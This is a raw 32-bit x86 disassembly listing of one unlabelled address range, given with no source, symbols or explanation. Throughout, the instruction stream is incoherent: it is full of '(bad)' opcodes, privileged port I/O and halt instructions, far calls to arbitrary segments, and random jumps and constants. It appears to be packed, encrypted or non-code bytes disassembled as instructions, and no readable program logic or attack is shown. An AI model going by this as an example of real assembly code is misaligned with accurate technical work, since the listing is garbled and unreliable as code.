  415a27:	push   ecx
  415a28:	dec    edx
  415a29:	ror    BYTE PTR [ebp+0x16de5d28],0xae
  415a30:	test   DWORD PTR [esi+0xa45ab01],esp
  415a36:	es aas 
  415a38:	sub    BYTE PTR [eax+0x50],ah
  415a3b:	or     DWORD PTR [edx-0x21],ebx
  415a3e:	lods   al,BYTE PTR ds:[esi]
  415a3f:	xchg   esp,eax
  415a40:	xchg   edx,eax
  415a41:	ins    BYTE PTR es:[edi],dx
  415a42:	xchg   esi,eax
  415a43:	cmp    edx,DWORD PTR [ecx]
  415a45:	jns    0x415a5f
  415a47:	or     esi,esp
  415a49:	pop    ecx
  415a4a:	push   edi
  415a4b:	add    ebx,esi
  415a4d:	out    0xc7,eax
  415a4f:	lock out dx,al
  415a51:	pop    ebp
  415a52:	sub    al,BYTE PTR [esi+0x500cc970]
  415a58:	jp     0x415a27
  415a5a:	cmp    BYTE PTR [eax-0x69],ch
  415a5d:	nop    DWORD PTR [ecx]
  415a60:	fisttp WORD PTR [ecx+esi*4+0x6f]
  415a64:	fidivr WORD PTR [ebx]
  415a66:	les    ecx,FWORD PTR [esi]
  415a68:	or     cl,BYTE PTR [ebx+0x59f2a531]
  415a6e:	sbb    DWORD PTR [edx+ecx*8-0x1d1f3a82],esp
  415a75:	daa    
  415a76:	xchg   ebx,eax
  415a77:	iret   
  415a78:	mov    bh,BYTE PTR [ebx]
  415a7a:	mov    dh,0x4a
  415a7c:	adc    al,0x42
  415a7e:	mov    dl,0x6d
  415a80:	scas   al,BYTE PTR es:[edi]
  415a81:	add    eax,0x9b28c295
  415a86:	add    DWORD PTR [edi+ebp*4+0x17],ebp
  415a8a:	adc    DWORD PTR ds:0xb27df506,esp
  415a90:	cld    
  415a91:	add    BYTE PTR [esi],dh
  415a93:	push   0xa4818a30
  415a98:	jbe    0x415a24
  415a9a:	(bad)  
  415a9b:	clc    
  415a9c:	int    0xd9
  415a9e:	and    al,0x6c
  415aa0:	aas    
  415aa1:	test   BYTE PTR [eax+0x36614fc5],dh
  415aa7:	or     DWORD PTR [edx],esp
  415aa9:	aam    0x3d
  415aab:	fs sub al,0xd9
  415aae:	int3   
  415aaf:	sub    edi,DWORD PTR [esi]
  415ab1:	mov    eax,ebx
  415ab3:	push   eax
  415ab4:	fs ret 0x8a20
  415ab8:	sub    al,0xc1
  415aba:	jl     0x415ad3
  415abc:	and    eax,0x3c05a242
  415ac1:	xchg   ebp,eax
  415ac2:	and    eax,0x50049a96
  415ac7:	sar    edi,1
  415ac9:	push   es
  415aca:	inc    ebx
  415acb:	hlt    
  415acc:	arpl   sp,bx
  415ace:	jns    0x415ae6
  415ad0:	out    0xec,eax
  415ad2:	stc    
  415ad3:	cmp    bl,cl
  415ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ad6:	jecxz  0x415ade
  415ad8:	fisub  DWORD PTR [edi-0x4f]
  415adb:	loopne 0x415afe
  415add:	cmp    al,0x5
  415adf:	pop    esi
  415ae0:	out    dx,al
  415ae1:	imul   edi,ecx,0x4c
  415ae4:	add    eax,0xc3502f03
  415ae9:	mov    bh,0xa0
  415aeb:	hlt    
  415aec:	and    esp,DWORD PTR [edi+eiz*8+0x6afef1f4]
  415af3:	ret    
  415af4:	xchg   edx,eax
  415af5:	dec    eax
  415af6:	sbb    ebx,DWORD PTR [esi]
  415af8:	int3   
  415af9:	mov    al,0x92
  415afb:	loope  0x415b28
  415afd:	cmc    
  415afe:	cwde   
  415aff:	adc    al,0xd5
  415b01:	mov    esp,0x36f8c022
  415b06:	ins    BYTE PTR es:[edi],dx
  415b07:	pop    ecx
  415b08:	jnp    0x415b0b
  415b0a:	sub    DWORD PTR [edi],edx
  415b0c:	sub    esi,DWORD PTR [esp+eiz*4-0x5bfbb724]
  415b13:	jecxz  0x415ac4
  415b15:	sbb    BYTE PTR [ebx],ah
  415b17:	test   BYTE PTR ds:0xaaa95f62,ch
  415b1d:	mov    edi,DWORD PTR [edi]
  415b1f:	fwait
  415b20:	scas   al,BYTE PTR es:[edi]
  415b21:	in     al,0x20
  415b23:	add    edi,DWORD PTR [eax+0x42]
  415b26:	and    ecx,eax
  415b28:	push   es
  415b29:	pop    ebp
  415b2a:	pop    ds
  415b2b:	sbb    eax,0x9ba910c0
  415b30:	or     DWORD PTR [edi+edi*2],ebp
  415b33:	loope  0x415ba0
  415b35:	adc    eax,0xd354eeb6
  415b3a:	mov    ebp,0xe797a01a
  415b3f:	mov    esi,0xa1c8e973
  415b44:	adc    BYTE PTR [ebx-0x5a],al
  415b47:	data16 cmp BYTE PTR [eax-0x6a14cf23],bl
  415b4e:	aas    
  415b4f:	inc    edx
  415b50:	inc    esi
  415b51:	adc    DWORD PTR [edx+0x78e1521c],ebp
  415b57:	jge    0x415b9c
  415b59:	sbb    dh,BYTE PTR [edi-0x33]
  415b5c:	lea    esp,[edi]
  415b5e:	aas    
  415b5f:	pop    eax
  415b60:	jecxz  0x415ae7
  415b62:	sbb    edx,DWORD PTR [esi-0x6625e754]
  415b68:	aam    0xf8
  415b6a:	mov    esi,0x90d76ed
  415b6f:	popf   
  415b70:	(bad)  
  415b71:	das    
  415b72:	imul   eax,DWORD PTR [ecx],0x1
  415b75:	es retf 
  415b77:	inc    esp
  415b78:	sub    al,0x1f
  415b7a:	pop    ss
  415b7b:	aaa    
  415b7c:	sar    DWORD PTR [edx],1
  415b7e:	shr    BYTE PTR [edx+0x229e209e],cl
  415b84:	test   DWORD PTR [edi+0x3b],eax
  415b87:	sub    ch,BYTE PTR [edx-0x1b]
  415b8a:	dec    edi
  415b8b:	sub    ebp,ebx
  415b8d:	retf   
  415b8e:	pop    ecx
  415b8f:	jo     0x415b5e
  415b91:	mov    al,0xf1
  415b93:	into   
  415b94:	xchg   esp,eax
  415b95:	add    ah,BYTE PTR [edx-0x7974d05e]
  415b9b:	fsubr  DWORD PTR [esi+0x51e4a8bb]
  415ba1:	aam    0xd4
  415ba3:	imul   ecx,DWORD PTR [ebx-0x3a833296],0x7e
  415baa:	jp     0x415ba0
  415bac:	or     al,0x35
  415bae:	sub    cl,dh
  415bb0:	pusha  
  415bb1:	add    eax,0x3c8ac586
  415bb6:	or     eax,0xc53e0020
  415bbb:	mov    al,ds:0x9b95b85a
  415bc0:	add    al,0xaf
  415bc2:	rcl    DWORD PTR [ebx-0x23],0xd6
  415bc6:	ins    BYTE PTR es:[edi],dx
  415bc7:	int3   
  415bc8:	pop    ss
  415bc9:	cwde   
  415bca:	popf   
  415bcb:	popa   
  415bcc:	xchg   ebp,eax
  415bcd:	imul   BYTE PTR [eax]
  415bcf:	add    bh,BYTE PTR [eax]
  415bd1:	fld    TBYTE PTR [ebx+0x2d1477a6]
  415bd7:	dec    ecx
  415bd8:	push   ecx
  415bd9:	stc    
  415bda:	cld    
  415bdb:	or     dh,BYTE PTR [edx-0x1579c7ed]
  415be1:	mov    fs:0x47e2152c,eax
  415be7:	(bad)  
  415be8:	push   ebx
  415be9:	or     BYTE PTR [ebx-0x33],cl
  415bec:	js     0x415c0c
  415bee:	jmp    0x58b6:0x81cba9fa
  415bf5:	push   ss
  415bf6:	shr    DWORD PTR [ebx-0x68a38efb],cl
  415bfc:	leave  
  415bfd:	iret   
  415bfe:	mov    esp,DWORD PTR [edi-0x1a713b03]
  415c04:	push   0x80886ee2
  415c09:	push   ss
  415c0a:	sub    eax,0x25bafe74
  415c0f:	push   ecx
  415c10:	stc    
  415c11:	lock jle 0x415c22
  415c14:	nop
  415c15:	mov    esi,0x12940f99
  415c1a:	inc    ecx
  415c1b:	or     al,0x0
  415c1d:	fld    QWORD PTR [ebx+0x0]
  415c20:	cmp    esi,DWORD PTR [edi]
  415c22:	sahf   
  415c23:	jno    0x415ba5
  415c25:	fwait
  415c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c27:	popf   
  415c28:	add    DWORD PTR [edi],ebp
  415c2a:	call   DWORD PTR [edx-0x7b]
  415c2d:	adc    ebp,DWORD PTR [edx-0x6e185331]
  415c33:	push   esp
  415c34:	shl    DWORD PTR [esi],cl
  415c36:	retf   0xbb28
  415c39:	mov    al,0xcf
  415c3b:	push   edx
  415c3c:	pop    ss
  415c3d:	sbb    al,0x9e
  415c3f:	loop   0x415c25
  415c41:	xor    esi,ecx
  415c43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c44:	add    al,0x60
  415c46:	pop    edi
  415c47:	push   ebp
  415c48:	xlat   BYTE PTR ds:[ebx]
  415c49:	pushf  
  415c4a:	es daa 
  415c4c:	scas   al,BYTE PTR es:[edi]
  415c4d:	push   edi
  415c4e:	jbe    0x415bff
  415c50:	mov    esp,0xe6efb44e
  415c55:	xor    al,0x97
  415c57:	gs loopne 0x415c89
  415c5a:	cmc    
  415c5b:	mul    BYTE PTR [ebp+0xa]
  415c5e:	call   0x8fef:0xb4fae57
  415c65:	popa   
  415c66:	sub    bl,bl
  415c68:	mov    bl,0xfe
  415c6a:	in     eax,0x5c
  415c6c:	scas   eax,DWORD PTR es:[edi]
  415c6d:	ins    BYTE PTR es:[edi],dx
  415c6e:	or     al,0xd0
  415c70:	ss inc ecx
  415c72:	and    eax,0x9bc94b01
  415c77:	arpl   WORD PTR [ebx-0x31d881ea],bx
  415c7d:	adc    al,0x3
  415c7f:	xlat   BYTE PTR ds:[ebx]
  415c80:	out    dx,eax
  415c81:	call   eax
  415c83:	std    
  415c84:	inc    esi
  415c85:	stc    
  415c86:	dec    ebx
  415c87:	mov    ah,0x9d
  415c89:	and    eax,0x73b8aa18
  415c8e:	mov    cl,ch
  415c90:	jp     0x415c7a
  415c92:	mov    cl,0x58
  415c94:	jle    0x415c57
  415c96:	adc    al,0x8b
  415c98:	sub    cl,BYTE PTR [edx-0x3f]
  415c9b:	je     0x415d13
  415c9d:	in     al,dx
  415c9e:	js     0x415d0b
  415ca0:	and    DWORD PTR [esi+0x55],ebp
  415ca3:	cdq    
  415ca4:	add    ebx,DWORD PTR [edx+0x41]
  415ca7:	data16 (bad) 
  415caa:	and    BYTE PTR es:[edx-0x16],al
  415cae:	mov    esp,0xfcaf2d35
  415cb3:	adc    BYTE PTR [edx],0x5d
  415cb6:	cld    
  415cb7:	arpl   WORD PTR [edx],sp
  415cb9:	int    0x98
  415cbb:	mov    ds:0xe08824e8,eax
  415cc0:	mov    cl,0x4a
  415cc2:	dec    ecx
  415cc3:	outs   dx,BYTE PTR ds:[esi]
  415cc4:	sub    eax,edi
  415cc6:	sbb    ebp,DWORD PTR [edi+esi*1]
  415cc9:	pop    ebp
  415cca:	mov    ch,ch
  415ccc:	and    al,0x98
  415cce:	call   0xfd1a:0xfca6ec3c
  415cd5:	mul    BYTE PTR [ebp-0x5f22c1d0]
  415cdb:	sbb    ebx,DWORD PTR [ebx]
  415cdd:	in     al,0x9f
  415cdf:	pop    es
  415ce0:	xchg   ebp,eax
  415ce1:	mov    ebx,0x2120dfe1
  415ce6:	pop    edi
  415ce8:	add    ch,BYTE PTR [ebx-0x28e487cc]
  415cee:	fiadd  WORD PTR [edx-0x1c]
  415cf1:	int    0xe
  415cf3:	jae    0x415d10
  415cf5:	shl    esp,0xb0
  415cf8:	add    al,0xa1
  415cfa:	adc    al,dh
  415cfc:	stos   DWORD PTR es:[edi],eax
  415cfd:	jb     0x415d61
  415cff:	dec    eax
  415d00:	std    
  415d01:	adc    DWORD PTR [edx+0x3f],esi
  415d04:	mov    BYTE PTR [ecx],bl
  415d06:	mov    ds:0xdf0529d5,eax
  415d0b:	mov    al,0x55
  415d0d:	in     al,0x59
  415d0f:	or     eax,0x946cec48
  415d14:	push   esp
  415d15:	cmp    ah,dl
  415d17:	cli    
  415d18:	mov    ah,0xac
  415d1a:	push   edi
  415d1b:	xor    eax,0xc800bed7
  415d20:	and    eax,ecx
  415d22:	sti    
  415d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d24:	repnz add edx,DWORD PTR [edx]
  415d27:	test   al,0x56
  415d29:	sub    esp,edx
  415d2b:	jne    0x415d70
  415d2d:	jl     0x415d16
  415d2f:	mov    al,ds:0xa4c5b178
  415d34:	dec    ebx
  415d35:	dec    ch
  415d37:	rcl    DWORD PTR [esi-0x71],0x2
  415d3b:	add    al,0x43
  415d3d:	lds    eax,FWORD PTR [edi-0x2f89f9e0]
  415d43:	cmp    al,0xe2
  415d45:	inc    ebp
  415d46:	xor    ch,BYTE PTR [ebp-0xe]
  415d49:	iret   
  415d4a:	sahf   
  415d4b:	xchg   ah,ch
  415d4d:	daa    
  415d4e:	jge    0x415d09
  415d50:	cdq    
  415d51:	xchg   esp,eax
  415d52:	ret    0xb9ff
  415d55:	or     BYTE PTR [edi+0xa],al
  415d58:	jmp    0xe419f33f
  415d5d:	xchg   ebp,eax
  415d5e:	cdq    
  415d5f:	data16 lock xor BYTE PTR [esi+esi*8+0x73],ch
  415d65:	xor    al,BYTE PTR ds:0x230e17d5
  415d6b:	xor    ecx,DWORD PTR [edi-0x10]
  415d6e:	jle    0x415d30
  415d70:	xor    esp,DWORD PTR [edx+0x69ca4bb6]
  415d76:	adc    DWORD PTR [edx+0x47838aa1],edx
  415d7c:	pcmpgtb mm1,QWORD PTR [eax+0x6609f7bc]
  415d83:	jp     0x415df3
  415d85:	mov    ah,0x49
  415d87:	rcl    DWORD PTR [ebx+0x52],0x7f
  415d8b:	jl     0x415d9a
  415d8d:	cdq    
  415d8e:	rcl    eax,1
  415d90:	mov    ds:0x41471c98,al
  415d95:	aad    0x69
  415d97:	ss cdq 
  415d99:	int3   
  415d9a:	(bad)
  415d9d:	mov    eax,0x8bcfbfe1
  415da2:	in     eax,0xaf
  415da4:	push   edx
  415da5:	and    bl,0x52
  415da8:	dec    eax
  415da9:	lock xchg BYTE PTR [eax],dl
  415dac:	sbb    al,0x1
  415dae:	retf   0x38fb
  415db1:	addr16 mov bh,0xcb
  415db4:	aaa    
  415db5:	mov    ebp,0x81d84bc
  415dba:	fwait
  415dbb:	pop    ebp
  415dbc:	push   ebp
  415dbd:	es mov al,0xb6
  415dc0:	test   BYTE PTR [eax-0x43b945cb],0x2b
  415dc7:	and    ch,BYTE PTR [eax]
  415dc9:	add    DWORD PTR [esi-0x31],edx
  415dcc:	mov    eax,0x3253f04a
  415dd1:	imul   BYTE PTR [edi]
  415dd3:	fld    QWORD PTR [eax+0x5bdac1e5]
  415dd9:	jmp    0x415e18
  415ddb:	pushf  
  415ddc:	fidivr WORD PTR [eax*4+0x40ec33b1]
  415de3:	push   cs
  415de4:	mov    esi,0xa34d8cb1
  415de9:	stos   DWORD PTR es:[edi],eax
  415dea:	fxch   st(2)
  415dec:	lahf   
  415ded:	dec    ebx
  415dee:	push   ss
  415def:	mov    gs,WORD PTR [ecx]
  415df1:	jno    0x415e33
  415df3:	mov    cs,ecx
  415df5:	int    0xd3
  415df7:	pop    esp
  415df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415df9:	or     ebx,DWORD PTR [eax-0x6215df13]
  415dff:	fisub  WORD PTR [eax-0x67]
  415e02:	push   ds
  415e03:	xor    eax,0x44f913bb
  415e08:	in     al,0x5
  415e0a:	mov    esp,0xc918b65e
  415e0f:	stos   BYTE PTR es:[edi],al
  415e10:	and    BYTE PTR [eax-0x24],0xbc
  415e14:	std    
  415e15:	retf   
  415e16:	cmp    dl,dh
  415e18:	adc    al,0x87
  415e1a:	retf   
  415e1b:	xor    bl,BYTE PTR [edi+ecx*8]
  415e1e:	retf   0xb93a
  415e21:	mov    cl,0x57
  415e23:	ins    DWORD PTR es:[edi],dx
  415e24:	adc    al,0xef
  415e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e27:	adc    eax,0x4fc74592
  415e2c:	adc    BYTE PTR [ebx-0x24be382c],0x3a
  415e33:	stc    
  415e34:	test   eax,0xccb259c8
  415e39:	mov    dl,0x76
  415e3b:	call   0x59823dd1
  415e40:	sbb    DWORD PTR [esi-0x21ea21c4],ebx
  415e46:	cld    
  415e47:	jbe    0x415e6a
  415e49:	outs   dx,BYTE PTR ds:[esi]
  415e4a:	dec    esp
  415e4b:	mov    bl,BYTE PTR [edi]
  415e4d:	or     esi,DWORD PTR [edi+0xddff91b]
  415e53:	jp     0x415e4d
  415e55:	lods   al,BYTE PTR ds:[esi]
  415e56:	imul   edi,DWORD PTR ds:0x150c8ccb,0x894ed49a
  415e60:	or     eax,0xa87338bb
  415e65:	popa   
  415e66:	inc    ecx
  415e67:	in     eax,0xf7
  415e69:	mov    edi,eax
  415e6b:	mov    BYTE PTR [eax+ebp*4],al
  415e6e:	les    ebp,FWORD PTR [edi-0x3f4eab55]
  415e74:	stc    
  415e75:	adc    BYTE PTR [ebx-0x28e7ac23],cl
  415e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7c:	sbb    eax,0x5aab0b14
  415e81:	fstp   DWORD PTR [ebx]
  415e83:	cdq    
  415e84:	inc    edi
  415e85:	stos   BYTE PTR es:[edi],al
  415e86:	dec    esi
  415e87:	jbe    0x415e28
  415e89:	test   al,0xc2
  415e8b:	cmp    ebp,DWORD PTR [ecx-0x111fca68]
  415e91:	cli    
  415e92:	sub    edi,esp
  415e94:	fist   DWORD PTR [edi]
  415e96:	dec    ecx
  415e97:	clc    
  415e98:	sbb    cl,dl
  415e9a:	loope  0x415ea8
  415e9c:	repnz mov ecx,0x98d4a8f4
  415ea2:	cld    
  415ea3:	push   esi
  415ea4:	js     0x415eef
  415ea6:	imul   ebp,DWORD PTR [ebp+0x53f41465],0x49
  415ead:	sbb    DWORD PTR [esi+0x1e3ef74e],edi
  415eb3:	xor    al,0x99
  415eb5:	shl    DWORD PTR [edx+0x6aad08fd],cl
  415ebb:	or     al,BYTE PTR ds:0x518fce81
  415ec1:	xor    ebp,DWORD PTR [ebx-0x5616363d]
  415ec7:	add    eax,0x6b4c5e2f
  415ecc:	aas    
  415ecd:	adc    esp,edx
  415ecf:	fidiv  WORD PTR [esp+eax*1-0x65cd8ef6]
  415ed6:	int3   
  415ed7:	add    eax,0x1a3035be
  415edc:	(bad)  
  415edd:	pop    ebp
  415ede:	shr    cl,0x43
  415ee1:	xor    bh,BYTE PTR [esi-0x6f38c06f]
  415ee7:	jne    0x415f38
  415ee9:	mov    ds:0x78e1e72e,al
  415eee:	push   esp
  415eef:	ss lods al,BYTE PTR cs:[esi]
  415ef2:	out    dx,al
  415ef3:	data16 jns 0x415e7f
  415ef6:	dec    ebp
  415ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ef8:	push   es
  415ef9:	jo     0x415f13
  415efb:	or     al,0x7e
  415efd:	push   0xffffffb2
  415eff:	sbb    DWORD PTR [ebx-0x25],edi
  415f02:	xor    BYTE PTR [esp+eax*1-0x10],cl
  415f06:	jle    0x415ebf
  415f08:	xlat   BYTE PTR ds:[ebx]
  415f09:	sbb    DWORD PTR [ecx+0xa8f7887],eax
  415f0f:	mov    ss,WORD PTR [ebx-0x6e5b8da4]
  415f15:	loopne 0x415ed7
  415f17:	(bad)  
  415f18:	sar    BYTE PTR [eax+0x51faa250],cl
  415f1e:	dec    eax
  415f1f:	pushf  
  415f20:	in     al,dx
  415f21:	mov    BYTE PTR [esi],0xf5
  415f24:	mov    dl,0x70
  415f26:	cmp    al,BYTE PTR [esi]
  415f28:	jg     0x415ed9
  415f2a:	ret    
  415f2b:	jl     0x415eb9
  415f2d:	xlat   BYTE PTR ds:[ebx]
  415f2e:	(bad)  
  415f30:	ins    BYTE PTR es:[edi],dx
  415f31:	ss mov esp,0x667cd2d7
  415f37:	and    cl,BYTE PTR [esi+0x19]
  415f3a:	in     eax,0x3f
  415f3c:	xchg   edi,eax
  415f3d:	(bad)
  415f40:	call   0xdda2f71d
  415f45:	add    eax,0xbc630e09
  415f4a:	repz cmc 
  415f4c:	mov    bl,0xb4
  415f4e:	outs   dx,DWORD PTR ds:[esi]
  415f4f:	imul   eax,DWORD PTR [eax+0x39],0xcedb20d3
  415f56:	std    
  415f57:	popf   
  415f58:	xchg   esi,eax
  415f59:	mov    esi,0x251a1f4e
  415f5e:	int3   
  415f5f:	or     edi,eax
  415f61:	pop    ebp
  415f62:	dec    BYTE PTR [ebp-0x61]
  415f65:	ret    
  415f66:	xchg   edx,eax
  415f67:	ss jmp 0x415fcd
  415f6a:	push   ecx
  415f6b:	pop    esp
  415f6c:	sbb    BYTE PTR cs:[ebx],0x9c
  415f70:	test   al,0x34
  415f72:	sub    dl,BYTE PTR [ebp+ecx*2-0x5dd8b9e4]
  415f79:	sbb    DWORD PTR [esi],edx
  415f7b:	mov    esi,0x30974c3
  415f80:	sbb    BYTE PTR [ecx+0x5f],bl
  415f83:	leave  
  415f84:	adc    al,0x25
  415f86:	pop    esi
  415f87:	addr16 (bad) 
  415f89:	cmp    esi,DWORD PTR [edx+0x59186846]
  415f8f:	pusha  
  415f90:	rcl    edi,1
  415f92:	ins    DWORD PTR es:[edi],dx
  415f93:	inc    ecx
  415f94:	sub    DWORD PTR [edx-0x7ad84e2b],eax
  415f9a:	jle    0x415f52
  415f9c:	push   ebp
  415f9d:	dec    eax
  415f9e:	jmp    0x415f25
  415fa0:	cwde   
  415fa1:	sbb    ch,BYTE PTR [ecx+0x7a770e2d]
  415fa7:	iret   
  415fa8:	in     al,dx
  415fa9:	cdq    
  415faa:	stos   BYTE PTR es:[edi],al
  415fab:	or     esp,DWORD PTR ds:0xc16b849d
  415fb1:	xchg   esp,eax
  415fb2:	aas    
  415fb3:	arpl   WORD PTR [edx-0x5c],dx
  415fb6:	jb     0x415f6a
  415fb8:	pop    ds
  415fb9:	and    eax,0xcff100f7
  415fbe:	xor    ecx,ebp
  415fc0:	fldenv [edi]
  415fc2:	xchg   esi,eax
  415fc3:	xchg   ecx,eax
  415fc4:	mov    edi,esi
  415fc6:	std    
  415fc7:	in     al,0xa2
  415fc9:	inc    esp
  415fca:	mov    BYTE PTR [ecx],al
  415fcc:	int3   
  415fcd:	mov    edx,esp
  415fcf:	mov    eax,0xa3c70a6c
  415fd4:	mov    bh,0x2c
  415fd6:	lahf   
  415fd7:	add    bl,BYTE PTR [ecx-0x4b05568e]
  415fdd:	lods   eax,DWORD PTR ds:[esi]
  415fde:	rcr    DWORD PTR [edx-0x29823069],1
  415fe4:	mov    BYTE PTR ds:0xc6963268,ch
  415fea:	and    DWORD PTR [esi],edx
  415fec:	adc    eax,0x43a2796e
  415ff1:	mov    ebx,0x2ba03d0e
  415ff6:	pop    esi
  415ff7:	add    ah,ah
  415ff9:	fwait
  415ffa:	out    0x18,al
  415ffc:	popa   
  415ffd:	cld    
  415ffe:	(bad)  [ebx]
  416000:	aas    
  416001:	jecxz  0x415fd0
  416003:	test   DWORD PTR [ebp*4+0x6be32509],edx
  41600a:	or     al,0x5b
  41600c:	in     eax,0x20
  41600e:	fstp   TBYTE PTR [ecx]
  416010:	ret    
  416011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416012:	pop    ss
  416013:	outs   dx,BYTE PTR ds:[esi]
  416014:	jb     0x416070
  416016:	int    0x6e
  416018:	stc    
  416019:	into   
  41601a:	xchg   eax,edx
  41601c:	(bad)  
  41601d:	mov    dl,0xb8
  41601f:	push   esi
  416020:	inc    ecx
  416021:	pop    ebp
  416022:	js     0x41601f
  416024:	nop
  416025:	and    eax,0xaeaf2bd6
  41602a:	xor    ebx,ebx
  41602c:	popf   
  41602d:	sbb    eax,0xe579d598
  416032:	pop    esp
  416033:	jle    0x416042
  416035:	sbb    DWORD PTR [ecx],esp
  416037:	loopne 0x416057
  416039:	dec    ebx
  41603a:	shl    DWORD PTR [eax-0x2b],0xf
  41603e:	dec    edi
  41603f:	pop    eax
  416040:	fist   DWORD PTR [ebp+0x37]
  416043:	out    dx,eax
  416044:	jae    0x4160a7
  416046:	xchg   esi,eax
  416047:	lock inc eax
  416049:	bound  ecx,QWORD PTR [ecx+ebx*1+0x7d]
  41604d:	fwait
  41604e:	mov    esp,0xba14dd1e
  416053:	mov    edi,0xcf2d36a0
  416058:	mov    dh,0xcd
  41605a:	hlt    
  41605b:	nop
  41605c:	cmp    ebp,DWORD PTR [edi*2-0x53096572]
  416063:	xor    edi,DWORD PTR [edi+edx*4]
  416066:	mov    edi,0x909eaca9
  41606b:	pop    esi
  41606c:	jno    0x415ff6
  41606e:	js     0x416027
  416070:	xor    dh,BYTE PTR [edi+0x25]
  416073:	into   
  416074:	pop    esp
  416075:	les    esp,FWORD PTR [esi]
  416077:	test   DWORD PTR [eax+0xf],ebx
  41607a:	std    
  41607b:	rcr    esi,1
  41607d:	cmp    ah,BYTE PTR [esi+0x23dc5168]
  416083:	hlt    
  416084:	leave  
  416085:	jle    0x416096
  416087:	fadd   DWORD PTR [ebp+0x1dc4b2f0]
  41608d:	hlt    
  41608e:	repz push eax
  416090:	mov    ah,0x8d
  416092:	pop    ds
  416093:	cwde   
  416094:	jmp    0x41602e
  416096:	pop    eax
  416097:	and    eax,0x51744fa7
  41609c:	lahf   
  41609d:	mov    edx,0x8572c22f
  4160a2:	pop    esi
  4160a3:	jmp    DWORD PTR [esi-0x3520f139]
  4160a9:	ret    
  4160aa:	cwde   
  4160ab:	mov    ds:0xc87ff50f,al
  4160b0:	in     eax,dx
  4160b1:	mov    dh,0xd0
  4160b3:	(bad)  
  4160b4:	repz ret 
  4160b6:	ins    DWORD PTR es:[edi],dx
  4160b7:	jl     0x4160c4
  4160b9:	jle    0x416127
  4160bb:	cmp    ebp,DWORD PTR [edx-0x47]
  4160be:	cli    
  4160bf:	loopne 0x416071
  4160c1:	mov    DWORD PTR [esi],ecx
  4160c3:	pop    ds
  4160c4:	push   ebp
  4160c5:	sub    edx,ebp
  4160c7:	or     al,0xc1
  4160c9:	call   0x46ed:0x8f440f6d
  4160d0:	test   DWORD PTR [eax-0x51],ecx
  4160d3:	mov    esp,0xc77c7fb8
  4160d8:	ins    DWORD PTR es:[edi],dx
  4160d9:	aaa    
  4160da:	retf   0x2d84
  4160dd:	jle    0x4160a6
  4160df:	rcr    BYTE PTR [edx+0x5bbc7d51],cl
  4160e5:	cmp    BYTE PTR [esi+0x19114e12],bl
  4160eb:	pop    edx
  4160ec:	jbe    0x4160b1
  4160ee:	push   edx
  4160ef:	add    eax,0x716f5bbe
  4160f4:	pusha  
  4160f5:	push   cs
  4160f6:	retf   
  4160f7:	and    al,0x11
  4160f9:	fst    DWORD PTR [edx+0x7047d764]
  4160ff:	pop    esi
  416100:	outs   dx,DWORD PTR ds:[esi]
  416101:	or     esp,DWORD PTR [ebp-0x54]
  416104:	dec    esi
  416105:	xchg   ecx,eax
  416106:	mov    esp,0x2b1f0ed5
  41610b:	aaa    
  41610c:	mov    ds:0x740ee94d,al
  416111:	dec    edx
  416112:	mov    ch,0x30
  416114:	or     eax,0x80085b0f
  416119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41611a:	sbb    dl,dh
  41611c:	adc    al,0x78
  41611e:	loope  0x41613c
  416120:	icebp  
  416121:	nop
  416122:	scas   eax,DWORD PTR es:[edi]
  416123:	or     ecx,DWORD PTR [ecx]
  416125:	inc    ebp
  416126:	dec    edx
  416127:	lea    ebp,[edi-0x1d5b0a43]
  41612d:	inc    ebx
  41612e:	loopne 0x41611a
  416130:	inc    ebx
  416131:	jmp    0x41616a
  416133:	cli    
  416134:	xchg   edi,eax
  416135:	retf   
  416136:	jbe    0x416150
  416138:	pop    ecx
  416139:	ss iret 
  41613b:	scas   eax,DWORD PTR es:[edi]
  41613c:	push   esi
  41613d:	push   esi
  41613e:	stos   DWORD PTR es:[edi],eax
  41613f:	call   esi
  416141:	cmc    
  416142:	fiadd  WORD PTR [ecx-0x32c2bb1c]
  416148:	add    BYTE PTR [ecx+0x78],ch
  41614b:	adc    bh,BYTE PTR [edi]
  41614d:	or     ebx,DWORD PTR [edx-0x6d5ab32e]
  416153:	inc    eax
  416154:	mov    ds:0x3f860a75,al
  416159:	lds    edx,FWORD PTR [ecx+ebp*4-0x64f27740]
  416160:	adc    al,0x7a
  416162:	push   edx
  416163:	in     eax,dx
  416164:	push   eax
  416165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416166:	fisub  DWORD PTR [edi+0x2070b189]
  41616c:	fsubr  QWORD PTR [esi]
  41616e:	call   0xa304:0x6159abe0
  416175:	xchg   BYTE PTR [eax-0x45da6292],dl
  41617b:	xchg   esi,eax
  41617c:	push   esp
  41617d:	mov    bh,0xb7
  41617f:	lea    ebp,[eax-0x7f959a3f]
  416185:	lods   al,BYTE PTR ds:[esi]
  416186:	dec    edx
  416187:	mov    BYTE PTR [esi],ch
  416189:	mov    edx,0x5805bceb
  41618e:	pop    ds
  41618f:	cs clc 
  416191:	sub    DWORD PTR [edx-0x64c461f8],ecx
  416197:	xchg   edx,edx
  416199:	pusha  
  41619a:	jo     0x41617d
  41619c:	out    0x70,eax
  41619e:	xlat   BYTE PTR ds:[ebx]
  41619f:	dec    ecx
  4161a0:	sbb    edx,esi
  4161a2:	(bad)  
  4161a3:	ss daa 
  4161a5:	mov    ebp,DWORD PTR [ebx-0x2d]
  4161a8:	inc    edi
  4161a9:	adc    ah,BYTE PTR [ebp+0x56dc6174]
  4161af:	mov    bl,0x0
  4161b1:	cwde   
  4161b2:	pop    eax
  4161b3:	pusha  
  4161b4:	popa   
  4161b5:	jbe    0x416188
  4161b7:	xchg   dl,bh
  4161b9:	sbb    dl,BYTE PTR [edx-0x45e94f81]
  4161bf:	retf   0x386c
  4161c2:	sbb    al,0x33
  4161c4:	add    bl,dl
  4161c6:	test   edx,esi
  4161c8:	bound  eax,QWORD PTR [ecx+esi*2-0x26]
  4161cc:	jns    0x4161e0
